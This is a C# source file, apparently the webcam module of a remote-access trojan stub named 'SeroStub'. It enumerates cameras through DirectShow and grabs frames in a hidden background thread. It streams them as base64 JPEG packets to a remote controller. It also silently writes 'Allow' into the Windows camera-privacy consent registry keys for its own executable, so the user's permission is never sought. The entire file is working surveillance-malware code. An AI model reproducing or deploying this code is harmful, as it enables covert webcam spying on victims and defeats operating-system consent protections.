using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace SeroStub;

// DirectShow-only webcam capture using SampleGrabber graph.

internal static class WebcamFeature
{
    // ── DirectShow GUIDs ──────────────────────────────────────────────────────

    private static readonly Guid CLSID_SystemDeviceEnum    = new("62BE5D10-60EB-11D0-BD3B-00A0C911CE86");
    private static readonly Guid IID_ICreateDevEnum        = new("29840822-5B84-11D0-BD3B-00A0C911CE86");
    private static readonly Guid CLSID_VideoInputDeviceCat = new("860BB310-5D01-11D0-BD3B-00A0C911CE86");
    private static readonly Guid IID_IPropertyBag          = new("55272A00-42CB-11CE-8135-00AA004BB851");

    private static readonly Guid CLSID_FilterGraph          = new("E436EBB3-524F-11CE-9F53-0020AF0BA770");
    private static readonly Guid CLSID_CaptureGraphBuilder2 = new("BF87B6E1-8C27-11D0-B3F0-00AA003761C5");
    private static readonly Guid CLSID_SampleGrabber        = new("C1F400A0-3F08-11D3-9F0B-006008039E37");
    private static readonly Guid CLSID_NullRenderer         = new("C1F400A4-3F08-11D3-9F0B-006008039E37");
    private static readonly Guid IID_IGraphBuilder          = new("56A868A9-0AD4-11CE-B03A-0020AF0BA770");
    private static readonly Guid IID_ICaptureGraphBuilder2  = new("93E5A4E0-2D50-11D2-ABFA-00A0C9C6E38D");
    private static readonly Guid IID_IMediaControl          = new("56A868B1-0AD4-11CE-B03A-0020AF0BA770");
    private static readonly Guid IID_IBaseFilter            = new("56A86895-0AD4-11CE-B03A-0020AF0BA770");
    private static readonly Guid IID_ISampleGrabber         = new("6B652FFF-11FE-4FCE-92AD-0266B5D7C78F");
    private static readonly Guid PIN_CATEGORY_CAPTURE       = new("FB6C4281-0353-11D1-905F-0000C0CC16BA");
    private static readonly Guid MEDIATYPE_Video_DS         = new("73646976-0000-0010-8000-00AA00389B71");
    private static readonly Guid MEDIASUBTYPE_RGB24         = new("E436EB7D-524F-11CE-9F53-0020AF0BA770");
    private static readonly Guid MEDIASUBTYPE_YUY2          = new("32595559-0000-0010-8000-00AA00389B71");

    private const int    S_OK       = 0;
    private const uint   CLSCTX_INPROC = 1;

    // ── P/Invoke ──────────────────────────────────────────────────────────────

    [DllImport("ole32.dll")]
    private static extern int CoCreateInstance(ref Guid rclsid, IntPtr pUnkOuter, uint dwClsContext,
        ref Guid riid, out IntPtr ppv);
    [DllImport("ole32.dll")]
    private static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);
    [DllImport("ole32.dll")]
    private static extern int CreateBindCtx(uint reserved, out IntPtr ppbc);

    [DllImport("gdiplus.dll")]
    private static extern int GdipCreateBitmapFromScan0(int width, int height, int stride,
        int format, IntPtr scan0, out IntPtr bitmap);
    [DllImport("gdiplus.dll")]
    private static extern int GdipDisposeImage(IntPtr image);

    // ── Registry P/Invoke (camera privacy consent) ───────────────────────────

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    private static extern int RegCreateKeyExW(IntPtr hKey, string lpSubKey, uint Reserved,
        IntPtr lpClass, uint dwOptions, uint samDesired, IntPtr lpSecurityAttributes,
        out IntPtr phkResult, out uint lpdwDisposition);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    private static extern int RegSetValueExW(IntPtr hKey, string lpValueName, uint Reserved,
        uint dwType, byte[] lpData, uint cbData);
    [DllImport("advapi32.dll")]
    private static extern int RegCloseKey(IntPtr hKey);

    private static readonly IntPtr HKEY_CURRENT_USER  = new IntPtr(unchecked((int)0x80000001));
    private static readonly IntPtr HKEY_LOCAL_MACHINE = new IntPtr(unchecked((int)0x80000002));
    private const uint KEY_SET_VALUE           = 0x0002;
    private const uint REG_OPTION_NON_VOLATILE = 0;
    private const uint REG_SZ                  = 1;

    // ── COM struct & delegate types ───────────────────────────────────────────

    [StructLayout(LayoutKind.Sequential)]
    private struct AM_MEDIA_TYPE
    {
        public Guid  majortype;
        public Guid  subtype;
        public int   bFixedSizeSamples;
        public int   bTemporalCompression;
        public uint  lSampleSize;
        public Guid  formattype;
        public IntPtr pUnk;
        public uint  cbFormat;
        public IntPtr pbFormat;
    }

    [StructLayout(LayoutKind.Explicit, Size = 16)]
    private struct VARIANT
    {
        [FieldOffset(0)] public ushort vt;
        [FieldOffset(8)] public IntPtr val;
    }
    private const ushort VT_BSTR = 8;

    private delegate int QI_Del(IntPtr pThis, ref Guid riid, out IntPtr ppv);
    private delegate int SetFiltergraph_Del(IntPtr pThis, IntPtr pGraph);
    private delegate int AddFilter_Del(IntPtr pThis, IntPtr pFilter,
        [MarshalAs(UnmanagedType.LPWStr)] string pName);
    private delegate int RenderStream_Del(IntPtr pThis, ref Guid pCategory, ref Guid pType,
        IntPtr pSource, IntPtr pIntermediate, IntPtr pSink);
    private delegate int SetOneShot_Del(IntPtr pThis, int bOneShot);
    private delegate int SetMT_Del(IntPtr pThis, ref AM_MEDIA_TYPE pmt);
    private delegate int GetConnectedMediaType_Del(IntPtr pThis, out AM_MEDIA_TYPE pmt);
    private delegate int IMediaControl_Run_Del(IntPtr pThis);
    private delegate int SetCallback_Del(IntPtr pThis, IntPtr pCallback, int which);
    private delegate int CreateClassEnumerator_Del(IntPtr pThis, ref Guid cat, out IntPtr ppEnum, uint flags);
    private delegate int IEnumMoniker_Next_Del(IntPtr pThis, uint celt, out IntPtr rgelt, out uint fetched);
    private delegate int IMoniker_BindToStorage_Del(IntPtr pThis, IntPtr pbc, IntPtr left, ref Guid riid, out IntPtr ppv);
    private delegate int IMoniker_BindToObject_Del(IntPtr pThis, IntPtr pbc, IntPtr pmkToLeft, ref Guid riid, out IntPtr ppvResult);
    private delegate int IPropertyBag_Read_Del(IntPtr pThis,
        [MarshalAs(UnmanagedType.LPWStr)] string name, ref VARIANT pVar, IntPtr pErrLog);
    private delegate uint Release_Delegate(IntPtr pThis);

    // ── State ─────────────────────────────────────────────────────────────────

    private static volatile bool _running;
    private static Thread?       _thread;
    private static Func<int,string,System.Threading.Tasks.Task>? _send;
    private static WcamStartDataStub _cfg = new();

    private static volatile byte[]? _sgCbFrame;
    private static volatile int _cbFrameTotal;

    // ── Public API ────────────────────────────────────────────────────────────

    public static bool HasCamera()
    {
        try { return EnumDirectShowDevices().Length > 0; }
        catch { return false; }
    }

    public static void Start(WcamStartDataStub cfg, Func<int,string,System.Threading.Tasks.Task> send)
    {
        Stop();
        _cfg     = cfg;
        _send    = send;
        _running = true;
        _thread  = new Thread(CaptureLoop) { IsBackground = true, Name = "WcamCapture" };
        _thread.SetApartmentState(ApartmentState.STA);
        _thread.Start();
    }

    public static void Stop()
    {
        _running = false;
        WebcamDShow.Stop();
        _thread?.Join(3000);
        _thread = null;
    }

    // ── Capture loop ──────────────────────────────────────────────────────────

    private static void CaptureLoop()
    {
        try
        {
            GrantCameraPrivacy();

            var dsDevs = EnumDirectShowDevices();

            if (_cfg.DeviceIndex < 0)
            {
                SendDeviceList(Array.ConvertAll(dsDevs, d => d.name));
                return;
            }

            if (dsDevs.Length == 0) { SendError("No webcam device found."); return; }

            int di = Math.Clamp(_cfg.DeviceIndex, 0, dsDevs.Length - 1);
            TryDShowSampleGrabberCapture(di, dsDevs[di].symlink);
        }
        catch { }
    }

    // ── IUnknown helper ───────────────────────────────────────────────────────

    private static void IUnknown_Release(IntPtr p)
    {
        if (p == IntPtr.Zero) return;
        var fn = Marshal.GetDelegateForFunctionPointer<Release_Delegate>(
            Marshal.ReadIntPtr(Marshal.ReadIntPtr(p), 2 * IntPtr.Size));
        fn(p);
    }

    private static IntPtr ComQI(IntPtr p, Guid iid)
    {
        if (p == IntPtr.Zero) return IntPtr.Zero;
        var fn = Marshal.GetDelegateForFunctionPointer<QI_Del>(
            Marshal.ReadIntPtr(Marshal.ReadIntPtr(p), 0));
        return fn(p, ref iid, out IntPtr ppv) == S_OK ? ppv : IntPtr.Zero;
    }

    // ── DirectShow device enumeration ─────────────────────────────────────────

    private static (string name, string symlink)[] EnumDirectShowDevices()
    {
        var results = new List<(string, string)>();
        IntPtr pDevEnum = IntPtr.Zero, pEnum = IntPtr.Zero, pbc = IntPtr.Zero;
        try
        {
            CoInitializeEx(IntPtr.Zero, 2);
            var clsid = CLSID_SystemDeviceEnum;
            var iid   = IID_ICreateDevEnum;
            if (CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_INPROC, ref iid, out pDevEnum) != S_OK)
                return Array.Empty<(string, string)>();

            var cat = CLSID_VideoInputDeviceCat;
            var enumFn = Marshal.GetDelegateForFunctionPointer<CreateClassEnumerator_Del>(
                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pDevEnum), 3 * IntPtr.Size));
            if (enumFn(pDevEnum, ref cat, out pEnum, 0) != S_OK || pEnum == IntPtr.Zero)
                return Array.Empty<(string, string)>();

            CreateBindCtx(0, out pbc);
            var nextFn = Marshal.GetDelegateForFunctionPointer<IEnumMoniker_Next_Del>(
                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pEnum), 3 * IntPtr.Size));
            var iidPB = IID_IPropertyBag;

            while (true)
            {
                int hr = nextFn(pEnum, 1, out IntPtr pMoniker, out uint fetched);
                if (hr != S_OK || fetched == 0 || pMoniker == IntPtr.Zero) break;
                try
                {
                    var bindFn = Marshal.GetDelegateForFunctionPointer<IMoniker_BindToStorage_Del>(
                        Marshal.ReadIntPtr(Marshal.ReadIntPtr(pMoniker), 9 * IntPtr.Size));
                    if (bindFn(pMoniker, pbc, IntPtr.Zero, ref iidPB, out IntPtr pPB) == S_OK && pPB != IntPtr.Zero)
                    {
                        try
                        {
                            var readFn = Marshal.GetDelegateForFunctionPointer<IPropertyBag_Read_Del>(
                                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pPB), 3 * IntPtr.Size));
                            VARIANT vName = default, vLink = default;
                            readFn(pPB, "FriendlyName", ref vName, IntPtr.Zero);
                            readFn(pPB, "DevicePath",   ref vLink, IntPtr.Zero);
                            string name = vName.vt == VT_BSTR && vName.val != IntPtr.Zero
                                ? Marshal.PtrToStringBSTR(vName.val) ?? "" : "";
                            string link = vLink.vt == VT_BSTR && vLink.val != IntPtr.Zero
                                ? Marshal.PtrToStringBSTR(vLink.val) ?? "" : "";
                            if (vName.val != IntPtr.Zero) Marshal.FreeBSTR(vName.val);
                            if (vLink.val != IntPtr.Zero) Marshal.FreeBSTR(vLink.val);
                            if (!string.IsNullOrEmpty(name))
                                results.Add((name, link));
                        }
                        finally { IUnknown_Release(pPB); }
                    }
                }
                finally { IUnknown_Release(pMoniker); }
            }
        }
        catch { }
        finally
        {
            if (pbc      != IntPtr.Zero) IUnknown_Release(pbc);
            if (pEnum    != IntPtr.Zero) IUnknown_Release(pEnum);
            if (pDevEnum != IntPtr.Zero) IUnknown_Release(pDevEnum);
        }
        return results.ToArray();
    }

    // Get IBaseFilter* for DS device at devIdx (for graph building)
    private static IntPtr DSGetBaseFilter(int devIdx)
    {
        IntPtr pDevEnum = IntPtr.Zero, pEnum = IntPtr.Zero, pbc = IntPtr.Zero;
        try
        {
            var clsid = CLSID_SystemDeviceEnum;
            var iid   = IID_ICreateDevEnum;
            if (CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_INPROC, ref iid, out pDevEnum) != S_OK)
                return IntPtr.Zero;
            var cat = CLSID_VideoInputDeviceCat;
            var enumFn = Marshal.GetDelegateForFunctionPointer<CreateClassEnumerator_Del>(
                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pDevEnum), 3 * IntPtr.Size));
            if (enumFn(pDevEnum, ref cat, out pEnum, 0) != S_OK || pEnum == IntPtr.Zero)
                return IntPtr.Zero;
            CreateBindCtx(0, out pbc);
            var nextFn = Marshal.GetDelegateForFunctionPointer<IEnumMoniker_Next_Del>(
                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pEnum), 3 * IntPtr.Size));
            int idx = 0;
            while (true)
            {
                int hr = nextFn(pEnum, 1, out IntPtr pMoniker, out uint fetched);
                if (hr != S_OK || fetched == 0 || pMoniker == IntPtr.Zero) break;
                try
                {
                    if (idx == devIdx)
                    {
                        var bfIid  = IID_IBaseFilter;
                        var bindFn = Marshal.GetDelegateForFunctionPointer<IMoniker_BindToObject_Del>(
                            Marshal.ReadIntPtr(Marshal.ReadIntPtr(pMoniker), 8 * IntPtr.Size));
                        int bindHr = bindFn(pMoniker, pbc, IntPtr.Zero, ref bfIid, out IntPtr ppBF);
                        if (bindHr == S_OK && ppBF != IntPtr.Zero) return ppBF;
                        return IntPtr.Zero;
                    }
                    idx++;
                }
                finally { IUnknown_Release(pMoniker); }
            }
        }
        catch { }
        finally
        {
            if (pbc      != IntPtr.Zero) IUnknown_Release(pbc);
            if (pEnum    != IntPtr.Zero) IUnknown_Release(pEnum);
            if (pDevEnum != IntPtr.Zero) IUnknown_Release(pDevEnum);
        }
        return IntPtr.Zero;
    }

    // ── ISampleGrabberCB callback (vtable-built COM object) ───────────────────

    private static readonly Guid IID_ISampleGrabberCB =
        new(0x0579154A, 0x2B53, 0x4994, 0xB0, 0xD0, 0xE7, 0x73, 0x14, 0x8E, 0xFF, 0x85);
    private static readonly Guid IID_IUnknown =
        new(0x00000000, 0x0000, 0x0000, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46);

    [UnmanagedCallersOnly(CallConvs = new[] { typeof(CallConvStdcall) })]
    private static unsafe int SgCb_QI(IntPtr pThis, Guid* riid, IntPtr* ppv)
    {
        if (ppv == null) return unchecked((int)0x80004003);
        if (*riid == IID_IUnknown || *riid == IID_ISampleGrabberCB)
        {
            *ppv = pThis;
            return 0;
        }
        *ppv = IntPtr.Zero;
        return unchecked((int)0x80004002);
    }

    [UnmanagedCallersOnly(CallConvs = new[] { typeof(CallConvStdcall) })]
    private static uint SgCb_AddRef(IntPtr p) => 1;

    [UnmanagedCallersOnly(CallConvs = new[] { typeof(CallConvStdcall) })]
    private static uint SgCb_Release(IntPtr p) => 0;

    [UnmanagedCallersOnly(CallConvs = new[] { typeof(CallConvStdcall) })]
    private static int SgCb_SampleCB(IntPtr p, double t, IntPtr pSample) => 0;

    [UnmanagedCallersOnly(CallConvs = new[] { typeof(CallConvStdcall) })]
    private static unsafe int SgCb_BufferCB(IntPtr p, double t, IntPtr pBuffer, int len)
    {
        if (pBuffer == IntPtr.Zero || len <= 0) return 0;
        var b = new byte[len];
        Marshal.Copy(pBuffer, b, 0, len);
        System.Threading.Interlocked.Exchange(ref _sgCbFrame, b);
        System.Threading.Interlocked.Increment(ref _cbFrameTotal);
        return 0;
    }

    private static unsafe (IntPtr vtbl, IntPtr obj) AllocSGCallbackObj()
    {
        IntPtr vtbl = Marshal.AllocHGlobal(5 * IntPtr.Size);
        Marshal.WriteIntPtr(vtbl, 0 * IntPtr.Size, (IntPtr)(delegate* unmanaged[Stdcall]<IntPtr, Guid*, IntPtr*, int>)&SgCb_QI);
        Marshal.WriteIntPtr(vtbl, 1 * IntPtr.Size, (IntPtr)(delegate* unmanaged[Stdcall]<IntPtr, uint>)&SgCb_AddRef);
        Marshal.WriteIntPtr(vtbl, 2 * IntPtr.Size, (IntPtr)(delegate* unmanaged[Stdcall]<IntPtr, uint>)&SgCb_Release);
        Marshal.WriteIntPtr(vtbl, 3 * IntPtr.Size, (IntPtr)(delegate* unmanaged[Stdcall]<IntPtr, double, IntPtr, int>)&SgCb_SampleCB);
        Marshal.WriteIntPtr(vtbl, 4 * IntPtr.Size, (IntPtr)(delegate* unmanaged[Stdcall]<IntPtr, double, IntPtr, int, int>)&SgCb_BufferCB);
        IntPtr obj = Marshal.AllocHGlobal(IntPtr.Size);
        Marshal.WriteIntPtr(obj, vtbl);
        return (vtbl, obj);
    }

    // ── DirectShow SampleGrabber graph ────────────────────────────────────────

    private static void TryDShowSampleGrabberCapture(int devIdx, string symlink)
    {
        IntPtr pGraph = IntPtr.Zero, pBuilder = IntPtr.Zero;
        IntPtr pCapFilt = IntPtr.Zero, pGrabFilt = IntPtr.Zero;
        IntPtr pGrabIF = IntPtr.Zero, pNullRend = IntPtr.Zero;
        IntPtr pMediaCtrl = IntPtr.Zero;
        IntPtr cbVtbl = IntPtr.Zero, cbObj = IntPtr.Zero;
        try
        {
            var clsid = CLSID_FilterGraph;
            var iid   = IID_IGraphBuilder;
            int hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_INPROC, ref iid, out pGraph);
            if (hr != S_OK || pGraph == IntPtr.Zero) { SendError("FilterGraph failed."); return; }

            clsid = CLSID_CaptureGraphBuilder2;
            iid   = IID_ICaptureGraphBuilder2;
            hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_INPROC, ref iid, out pBuilder);
            if (hr != S_OK || pBuilder == IntPtr.Zero) { SendError("CaptureGraphBuilder2 failed."); return; }

            var setFgFn = Marshal.GetDelegateForFunctionPointer<SetFiltergraph_Del>(
                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pBuilder), 3 * IntPtr.Size));
            if (setFgFn(pBuilder, pGraph) != S_OK) { SendError("SetFiltergraph failed."); return; }

            var addFn = Marshal.GetDelegateForFunctionPointer<AddFilter_Del>(
                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pGraph), 3 * IntPtr.Size));

            pCapFilt = DSGetBaseFilter(devIdx);
            if (pCapFilt == IntPtr.Zero) { SendError("Could not open webcam device."); return; }
            addFn(pGraph, pCapFilt, "Capture");

            clsid = CLSID_SampleGrabber;
            iid   = IID_IBaseFilter;
            hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_INPROC, ref iid, out pGrabFilt);
            if (hr != S_OK || pGrabFilt == IntPtr.Zero) { SendError("SampleGrabber failed."); return; }

            pGrabIF = ComQI(pGrabFilt, IID_ISampleGrabber);
            if (pGrabIF == IntPtr.Zero) { SendError("QI ISampleGrabber failed."); return; }

            var setMtFn = Marshal.GetDelegateForFunctionPointer<SetMT_Del>(
                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pGrabIF), 4 * IntPtr.Size));
            var setOsFn = Marshal.GetDelegateForFunctionPointer<SetOneShot_Del>(
                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pGrabIF), 3 * IntPtr.Size));
            setOsFn(pGrabIF, 0);
            addFn(pGraph, pGrabFilt, "SG");

            clsid = CLSID_NullRenderer;
            iid   = IID_IBaseFilter;
            hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_INPROC, ref iid, out pNullRend);
            if (hr != S_OK || pNullRend == IntPtr.Zero) { SendError("NullRenderer failed."); return; }
            addFn(pGraph, pNullRend, "NR");

            var cat   = PIN_CATEGORY_CAPTURE;
            var mtype = MEDIATYPE_Video_DS;
            var rsFn  = Marshal.GetDelegateForFunctionPointer<RenderStream_Del>(
                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pBuilder), 7 * IntPtr.Size));

            // Format negotiation: YUY2 → RGB24 → any
            var mtYuy2 = new AM_MEDIA_TYPE { majortype = MEDIATYPE_Video_DS, subtype = MEDIASUBTYPE_YUY2 };
            setMtFn(pGrabIF, ref mtYuy2);
            hr = rsFn(pBuilder, ref cat, ref mtype, pCapFilt, pGrabFilt, pNullRend);
            if (hr != S_OK)
            {
                var mtRgb = new AM_MEDIA_TYPE { majortype = MEDIATYPE_Video_DS, subtype = MEDIASUBTYPE_RGB24 };
                setMtFn(pGrabIF, ref mtRgb);
                hr = rsFn(pBuilder, ref cat, ref mtype, pCapFilt, pGrabFilt, pNullRend);
                if (hr != S_OK)
                {
                    var mtAny = new AM_MEDIA_TYPE { majortype = MEDIATYPE_Video_DS };
                    setMtFn(pGrabIF, ref mtAny);
                    hr = rsFn(pBuilder, ref cat, ref mtype, pCapFilt, pGrabFilt, pNullRend);
                    if (hr != S_OK) { SendError($"RenderStream failed (0x{hr:X8})."); return; }
                }
            }

            // Read connected media type for frame dimensions + format
            int vidW = 640, vidH = 480, bpp = 3;
            bool sgIsMjpg = false, sgIsYuy2 = false;
            var getConnFn = Marshal.GetDelegateForFunctionPointer<GetConnectedMediaType_Del>(
                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pGrabIF), 5 * IntPtr.Size));
            if (getConnFn(pGrabIF, out AM_MEDIA_TYPE connMt) == S_OK
                && connMt.pbFormat != IntPtr.Zero && connMt.cbFormat >= 64)
            {
                vidW = Marshal.ReadInt32(connMt.pbFormat, 52);
                vidH = Math.Abs(Marshal.ReadInt32(connMt.pbFormat, 56));
                short biBitCount = Marshal.ReadInt16(connMt.pbFormat, 62);
                bpp = biBitCount >= 32 ? 4 : 3;
                if (connMt.cbFormat >= 68)
                {
                    uint biComp = (uint)Marshal.ReadInt32(connMt.pbFormat, 64);
                    sgIsMjpg = biComp == 0x47504A4D;
                    sgIsYuy2 = biComp == 0x32595559;
                }
                if (connMt.pUnk != IntPtr.Zero) IUnknown_Release(connMt.pUnk);
                Marshal.FreeCoTaskMem(connMt.pbFormat);
            }
            if (vidW <= 0) vidW = 640;
            if (vidH <= 0) vidH = 480;

            // Register ISampleGrabberCB callback (BufferCB)
            _sgCbFrame = null;
            unsafe
            {
                (cbVtbl, cbObj) = AllocSGCallbackObj();
                var setCbFn = Marshal.GetDelegateForFunctionPointer<SetCallback_Del>(
                    Marshal.ReadIntPtr(Marshal.ReadIntPtr(pGrabIF), 9 * IntPtr.Size));
                setCbFn(pGrabIF, cbObj, 1); // 1 = BufferCB
            }

            // Run graph
            pMediaCtrl = ComQI(pGraph, IID_IMediaControl);
            if (pMediaCtrl == IntPtr.Zero) { SendError("QI IMediaControl failed."); return; }
            var runFn = Marshal.GetDelegateForFunctionPointer<IMediaControl_Run_Del>(
                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pMediaCtrl), 7 * IntPtr.Size));
            runFn(pMediaCtrl);
            Thread.Sleep(400);

            RemoteDesktopFeature.EnsureGdiplusPublic();
            int intervalMs  = Math.Max(1000 / Math.Max(_cfg.Fps, 1), 33);
            long lastSendMs = 0;

            while (_running)
            {
                try
                {
                    Thread.Sleep(Math.Max(intervalMs / 2, 10));
                    long now = Environment.TickCount64;
                    if (now - lastSendMs < intervalMs) continue;

                    byte[]? raw = System.Threading.Interlocked.Exchange(ref _sgCbFrame, null);
                    if (raw == null || raw.Length == 0) continue;

                    byte[]? jpeg = sgIsMjpg ? raw
                        : sgIsYuy2 ? Yuy2ToJpeg(raw, vidW, vidH, _cfg.Quality)
                        : bpp == 4 ? Bgrx32ToJpeg(raw, vidW, vidH, _cfg.Quality)
                        : Rgb24ToJpeg(raw, vidW, vidH, _cfg.Quality);

                    if (jpeg == null || jpeg.Length == 0) continue;

                    lastSendMs = now;
                    var b64  = RemoteDesktopFeature.ToBase64(jpeg);
                    var json = "{\"w\":" + vidW + ",\"h\":" + vidH + ",\"j\":\"" + b64 + "\"}";
                    _send?.Invoke((int)PacketType.WcamFrame, json)
                         .ContinueWith(_ => { }, System.Threading.Tasks.TaskContinuationOptions.None);
                }
                catch { Thread.Sleep(intervalMs); }
            }
        }
        catch { }
        finally
        {
            if (pMediaCtrl != IntPtr.Zero)
            {
                try
                {
                    var stopFn = Marshal.GetDelegateForFunctionPointer<IMediaControl_Run_Del>(
                        Marshal.ReadIntPtr(Marshal.ReadIntPtr(pMediaCtrl), 9 * IntPtr.Size));
                    stopFn(pMediaCtrl);
                }
                catch { }
                IUnknown_Release(pMediaCtrl);
            }
            if (pGrabIF   != IntPtr.Zero) IUnknown_Release(pGrabIF);
            if (pNullRend != IntPtr.Zero) IUnknown_Release(pNullRend);
            if (pGrabFilt != IntPtr.Zero) IUnknown_Release(pGrabFilt);
            if (pCapFilt  != IntPtr.Zero) IUnknown_Release(pCapFilt);
            if (pBuilder  != IntPtr.Zero) IUnknown_Release(pBuilder);
            if (pGraph    != IntPtr.Zero) IUnknown_Release(pGraph);
            if (cbObj  != IntPtr.Zero) Marshal.FreeHGlobal(cbObj);
            if (cbVtbl != IntPtr.Zero) Marshal.FreeHGlobal(cbVtbl);
        }
    }

    // ── Raw frame → JPEG ──────────────────────────────────────────────────────

    private static byte[]? Yuy2ToJpeg(byte[] raw, int w, int h, int quality)
    {
        int bgraStride = w * 4;
        var bgra = new byte[bgraStride * h];
        int yuyStride = w * 2;
        for (int row = 0; row < h; row++)
        {
            for (int col = 0; col < w; col++)
            {
                int yuyBase = row * yuyStride + (col & ~1) * 2;
                byte Y = raw[row * yuyStride + col * 2];
                byte U = yuyBase + 1 < raw.Length ? raw[yuyBase + 1] : (byte)128;
                byte V = yuyBase + 3 < raw.Length ? raw[yuyBase + 3] : (byte)128;
                int C = Y - 16, D = U - 128, E = V - 128;
                int dst = row * bgraStride + col * 4;
                bgra[dst]     = (byte)Clamp255((298 * C + 516 * D           + 128) >> 8);
                bgra[dst + 1] = (byte)Clamp255((298 * C - 100 * D - 208 * E + 128) >> 8);
                bgra[dst + 2] = (byte)Clamp255((298 * C           + 409 * E + 128) >> 8);
                bgra[dst + 3] = 255;
            }
        }
        return BgraToJpeg(bgra, w, h, bgraStride, quality);
    }

    private static byte[]? Bgrx32ToJpeg(byte[] bgrx, int w, int h, int quality)
    {
        int stride = w * 4;
        var bgra = new byte[stride * h];
        for (int row = 0; row < h; row++)
        {
            int src = (h - 1 - row) * stride;
            int dst = row * stride;
            Buffer.BlockCopy(bgrx, src, bgra, dst, stride);
            for (int col = 0; col < w; col++) bgra[dst + col * 4 + 3] = 255;
        }
        return BgraToJpeg(bgra, w, h, stride, quality);
    }

    private static byte[]? Rgb24ToJpeg(byte[] rgb, int w, int h, int quality)
    {
        int bgraStride = w * 4;
        int srcStride  = w * 3;
        var bgra = new byte[bgraStride * h];
        for (int row = 0; row < h; row++)
        {
            int srcRow = h - 1 - row;
            for (int col = 0; col < w; col++)
            {
                int s = srcRow * srcStride + col * 3;
                int d = row   * bgraStride + col * 4;
                if (s + 2 >= rgb.Length) break;
                bgra[d] = rgb[s]; bgra[d+1] = rgb[s+1]; bgra[d+2] = rgb[s+2]; bgra[d+3] = 255;
            }
        }
        return BgraToJpeg(bgra, w, h, bgraStride, quality);
    }

    private static byte[]? BgraToJpeg(byte[] bgra, int w, int h, int stride, int quality)
    {
        unsafe
        {
            fixed (byte* p = bgra)
            {
                int hr = GdipCreateBitmapFromScan0(w, h, stride, 0x26200A, (IntPtr)p, out IntPtr gdipBitmap);
                if (hr != 0 || gdipBitmap == IntPtr.Zero) return null;
                try   { return RemoteDesktopFeature.GdipBitmapToJpeg(gdipBitmap, quality); }
                finally { GdipDisposeImage(gdipBitmap); }
            }
        }
    }

    private static int Clamp255(int v) => v < 0 ? 0 : v > 255 ? 255 : v;

    // ── Messaging ─────────────────────────────────────────────────────────────

    private static void SendError(string message)
    {
        var json = "{\"error\":\"" + EscapeJson(message) + "\"}";
        _send?.Invoke((int)PacketType.WcamDevices, json)
             .ContinueWith(_ => { }, System.Threading.Tasks.TaskContinuationOptions.None);
    }

    private static void SendDeviceList(string[] names)
    {
        var sb = new System.Text.StringBuilder();
        sb.Append("{\"devices\":[");
        for (int i = 0; i < names.Length; i++)
        {
            if (i > 0) sb.Append(',');
            sb.Append("{\"i\":").Append(i)
              .Append(",\"name\":\"").Append(EscapeJson(names[i])).Append("\"}");
        }
        sb.Append("]}");
        _send?.Invoke((int)PacketType.WcamDevices, sb.ToString())
             .ContinueWith(_ => { }, System.Threading.Tasks.TaskContinuationOptions.None);
    }

    // ── Camera privacy consent (Windows 11) ──────────────────────────────────

    private static void GrantCameraPrivacy()
    {
        const string basePath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam";
        byte[] allow = System.Text.Encoding.Unicode.GetBytes("Allow\0");

        if (RegCreateKeyExW(HKEY_CURRENT_USER, basePath, 0, IntPtr.Zero,
                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, IntPtr.Zero,
                            out IntPtr hk, out _) == 0)
        { RegSetValueExW(hk, "Value", 0, REG_SZ, allow, (uint)allow.Length); RegCloseKey(hk); }

        string? exe = Environment.ProcessPath;
        if (!string.IsNullOrEmpty(exe))
        {
            string appKey = exe.Replace('\\', '#').TrimStart('#');
            if (RegCreateKeyExW(HKEY_CURRENT_USER, $@"{basePath}\NonPackaged\{appKey}", 0,
                                IntPtr.Zero, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                                IntPtr.Zero, out IntPtr hk2, out _) == 0)
            { RegSetValueExW(hk2, "Value", 0, REG_SZ, allow, (uint)allow.Length); RegCloseKey(hk2); }
        }

        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, basePath, 0, IntPtr.Zero,
                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, IntPtr.Zero,
                            out IntPtr hkLm, out _) == 0)
        { RegSetValueExW(hkLm, "Value", 0, REG_SZ, allow, (uint)allow.Length); RegCloseKey(hkLm); }

        if (!string.IsNullOrEmpty(exe))
        {
            string appKey = exe.Replace('\\', '#').TrimStart('#');
            if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, $@"{basePath}\NonPackaged\{appKey}", 0,
                                IntPtr.Zero, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                                IntPtr.Zero, out IntPtr hkLm2, out _) == 0)
            { RegSetValueExW(hkLm2, "Value", 0, REG_SZ, allow, (uint)allow.Length); RegCloseKey(hkLm2); }
        }
    }

    private static string EscapeJson(string s)
        => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
}
